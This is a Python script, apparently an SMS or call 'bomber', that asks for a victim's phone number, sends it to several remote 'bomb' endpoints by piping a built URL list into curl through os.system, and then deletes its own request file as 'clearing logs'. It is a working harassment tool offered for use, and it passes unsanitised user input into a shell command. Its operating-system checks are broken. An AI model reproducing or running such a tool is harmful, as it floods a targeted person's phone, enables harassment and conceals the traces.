#!/usr/bin/python


import os
import datetime
import time
import random
 
#Importing colorama
try:
    from colorama import *
    print('[!] Checking for Requirements')
    print(" ")
    print(Fore.LIGHTRED_EX + 'Colorama' + Fore.LIGHTWHITE_EX + ' [' + Fore.LIGHTGREEN_EX + '✓' + Fore.LIGHTWHITE_EX + ']')
except Exception as e:
    print(e)
    print("'Colorama' was not found!")
    print("Installing colorama")
    os.system('pip install colorama')
    os.system("python3 pythonbomber.py")

#Importing requests
try:
    import requests
    print(Fore.LIGHTRED_EX + 'Requests' + Fore.LIGHTWHITE_EX + ' [' + Fore.LIGHTGREEN_EX + '✓' + Fore.LIGHTWHITE_EX + ']')
except Exception as e:
    print(e)
    print('Installing Requests')
    os.system('pip install requests')
    os.system('python3 pythonbomber.py')


# Importing sys
try:
    import sys
    print(Fore.LIGHTRED_EX + 'sys' + Fore.LIGHTWHITE_EX + '      [' + Fore.LIGHTGREEN_EX + '✓' + Fore.LIGHTWHITE_EX + ']')
except Exception as e:
    print(e)
    print('Installing sys')
    os.system('pip install sys')
    os.system('python3 pythonbomber.py')
print(" ")
print(" ")
input(" Press enter to continue...")
# Now the Show begins...
################################################### Har Har Mahadev ########################################################################


def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

clr()

def check_intr():
    print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Connecting to Servers...')
    try:
        requests.get("https://herokuapp.com")
        print(Fore.LIGHTWHITE_EX + "[" + Fore.LIGHTGREEN_EX + "✓" + Fore.LIGHTWHITE_EX + "] " + Fore.LIGHTGREEN_EX + "Connection Stablished Successfully!!")
        time.sleep(1)
        clr()
        pass
    except Exception:
        print(Fore.LIGHTWHITE_EX + "[" + Fore.LIGHTRED_EX + "✗" + Fore.LIGHTWHITE_EX + "] " + Fore.LIGHTRED_EX + "Error! Can't connect to Servers.")
        print(Fore.LIGHTWHITE_EX + "[" + Fore.LIGHTRED_EX + "✗" + Fore.LIGHTWHITE_EX + "] " + Fore.LIGHTRED_EX + "Poor Internet Connection!!")
        sys.exit(2)


check_intr()

cols = [Fore.LIGHTBLUE_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX]

def logo():
    print("""
    
                         :::!~!!!!!:.             
                  .xUHWH!! !!?M88WHX:.           
                .X*#M@$!!  !X!M$$$$$$WWx:.      
               :!!!!!!?H! :!$!$$$$$$$$$$8X:    
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:    
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!     
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!  Ram Ram!!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!   
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `         
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!            
$R@i.~~ !     :   ~$$$$$B$$en:``              
?MXT@Wx.~    :     ~"##*$$$$M~          
    """)


logo()

def dev_info():
    print(Fore.LIGHTWHITE_EX + '[' + '\033[1;32m~' + Fore.WHITE + '] ' + Fore.GREEN + 'Collecting Info...')
    if os.name == "posix":
        print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTGREEN_EX + "Parrot Operating System Detected!!")
    elif os.name == "kali":
       print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTGREEN_EX + "Kali Linux Operating System Detected!!")        
    else:
        print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTGREEN_EX + os.name + " Detected!!") 

dev_info()


def startup_time():
    Time=datetime.datetime.now().strftime('%H:%M:%S')
   # print(' ')
    #print(' ')
    print(Fore.WHITE + '[' + '\033[1;32m~' + Fore.WHITE + '] ' + Fore.GREEN + 'Tool Started at ' + Fore.CYAN + Time)  


startup_time()

number = input(Fore.WHITE + '[' + Fore.GREEN + '~' + Fore.WHITE + '] ' + Fore.GREEN + 'Enter the phone number of victim : ')

server1 = (' https://xlr81.herokuapp.com/bomb/'+number)
server2 = (' https://xlr82.herokuapp.com/bomb/'+number)
server3 = (' https://xlr83.herokuapp.com/bomb/'+number)
server4 = (' https://xlr84.herokuapp.com/bomb/'+number)
server5 = (' https://xlr85.herokuapp.com/bomb/'+number)
server6 = (' https://xlr86.herokuapp.com/bomb/'+number)

pair1 = [server1, server2, server3, server4, server5]
pair2 = [server2, server3, server4, server5, server6]
pair3 = [server3, server4, server5, server6, server1]
pair4 = [server4, server5, server6, server1, server2]
pair5 = [server5, server6, server1, server2, server3]
pair6 = [server6, server5, server4, server3, server2]

pairs_lst = [pair1, pair2, pair3, pair4, pair5, pair6]

def write_servers():
    print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Configuring Request...')
    f = open("serverconf.txt", "w")
    l = random.choice(pairs_lst)
    f.writelines(l)
    Time=datetime.datetime.now().strftime("%H:%M:%S")
    print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Started sending request at ' + Fore.LIGHTRED_EX + Time)
    f.close()


def read_servers():
    print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Getting Response from the servers...')
    print(" ")
    f = open("serverconf.txt", "r")
    os.system("curl"+f.read())
    print(" ")
    print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + " Clearing logs!")
    try:
        os.remove("serverconf.txt")
        print(Fore.WHITE + "[" + Fore.GREEN + "✓" + Fore.WHITE + "] " + Fore.GREEN + "Successfully cleared logs!")
    except Exception as e:
        print("✗"+e)


def main():
    write_servers()
    read_servers() 


def countdown(t):
    
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print("[#]  "+timer, end="\r")
        time.sleep(1)
        t -= 1
    print(Fore.WHITE + '[' + Fore.LIGHTRED_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTRED_EX + ' 00:00' )
    main()


t = input(Fore.WHITE + "[" + Fore.GREEN + "~" + Fore.WHITE + "] " + Fore.GREEN + "Enter Bombing Delay in 'Seconds': ")
print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + "Bombing in")

countdown(int(t))














































































































































































































































































































































































